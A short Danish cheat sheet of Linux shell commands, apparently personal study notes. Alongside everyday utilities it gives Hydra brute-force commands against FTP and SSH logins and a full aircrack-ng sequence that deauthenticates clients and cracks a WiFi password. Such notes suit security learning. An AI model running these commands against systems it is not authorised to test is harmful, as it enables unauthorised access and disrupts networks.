#### Funktionsmanual
```shell
man unzip
```

#### Skift password på bruger
```shell
sudo passwd <navn på brugeren>
```

#### Create eller update databasen brugt til locate kommandoen
```shell
updatedb
```

#### Sæt Tor browser som desktop app
```shell
./start-tor-browser.desktop --register-app
```



#### Eksempel på password crack med Hydra (-p string password, -P password liste, -l string username, -L list of usernames, -vV verbatim)
```shell
hydra -l admin -P /usr/share/john/password.lst -vV ftplogin.com ftp
```

#### Eksempel på bruteforce med Hydra 
```shell
hydra -l admin -V -x 4:4:IVXMLCD sshydra.com ssh
```

#### Wordcount
```shell
wc <filename>
```


#### Cut (essenetielt split fra js og python)
```shell
cut -d " " -f1 access.log| head
```

#### Uniq (Find unikke entries)
```shell
sort <filename> | uniq
```

#### tcpdump
```shell
sudo tcpdump -i eth0 host google.dk
sudo tcpdump tcp port 80 and host google.dk
sudo tcpdump tcp port 80 and dst host google.dk

# capture dns requests - DNS er på udp port 53
sudo tcpdump udp port 53 -v 
```

## aircrack-ng
```shell
sudo airmon-ng check kill # dræber alle devices der kan have indflydelse på netværket
sudo airmon-ng start wlan0 # starter netværkskortets monitoring mode
ifconfig # vi skal finde navnet på vores monitor netværk
sudo airodump-ng <netværksnavn> # begynder overvågning
sudo airodump-ng --bssid <MAC på AccessPoint> --channel <channel-nummer> --write <gemt fil med packets> <netværkskort> # fanger packets fra det valgte wifi
sudo aireplay-ng --deauth 50 -a <MAC på accesspoint> <netværkskort> # sender et deauth attack
sudo aircrack-ng <navn på gemt fil med packets> -w <en valgt wordlist> # cracker wifi password
```
